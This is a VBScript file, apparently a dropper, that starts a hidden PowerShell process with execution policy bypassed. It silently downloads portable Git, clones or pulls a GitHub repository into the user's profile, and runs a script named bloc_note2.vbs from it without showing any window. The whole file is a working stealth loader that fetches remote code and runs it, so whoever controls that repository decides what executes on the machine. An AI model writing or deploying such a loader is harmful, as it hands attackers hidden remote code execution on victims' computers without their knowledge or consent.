Set WshShell = CreateObject("WScript.Shell")

userProfile = WshShell.ExpandEnvironmentStrings("%USERPROFILE%")
outilsPath = userProfile & "\Outils"
gitPath = outilsPath & "\PortableGit"
repoPath = outilsPath & "\test"

' Utiliser PowerShell pour tout faire silencieusement
cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
"$ProgressPreference='SilentlyContinue';" & _
"$o='" & outilsPath & "';" & _
"$g='" & gitPath & "';" & _
"$r='" & repoPath & "';" & _
"if(!(Test-Path $o)){mkdir $o -Force|Out-Null};" & _
"if(!(Test-Path $g)){" & _
"$url='https://github.com/git-for-windows/git/releases/download/v2.43.0.windows.1/PortableGit-2.43.0-64-bit.7z.exe';" & _
"$zip=$o+'\git.7z.exe';" & _
"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" & _
"$wc=New-Object System.Net.WebClient;" & _
"$wc.DownloadFile($url,$zip);" & _
"$si=New-Object System.Diagnostics.ProcessStartInfo;" & _
"$si.FileName=$zip;" & _
"$si.Arguments='-o""'+$g+'"" -y';" & _
"$si.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden;" & _
"$si.CreateNoWindow=$true;" & _
"$p=[System.Diagnostics.Process]::Start($si);" & _
"$p.WaitForExit();" & _
"rm $zip -Force" & _
"};" & _
"$env:PATH=$g+'\bin;'+$env:PATH;" & _
"$env:GIT_TERMINAL_PROMPT='0';" & _
"cd $o;" & _
"if(!(Test-Path $r)){" & _
"Start-Process ($g+'\bin\git.exe') -ArgumentList '-c','credential.helper=','clone','https://github.com/Guardia-Root/test.git' -WindowStyle Hidden -Wait" & _
"}else{" & _
"cd $r;" & _
"Start-Process ($g+'\bin\git.exe') -ArgumentList 'pull' -WindowStyle Hidden -Wait" & _
"};" & _
"if(Test-Path($r+'\bloc_note2.vbs')){" & _
"Start-Process wscript -ArgumentList ($r+'\bloc_note2.vbs') -WindowStyle Hidden" & _
"}"


WshShell.Run cmd, 0, False
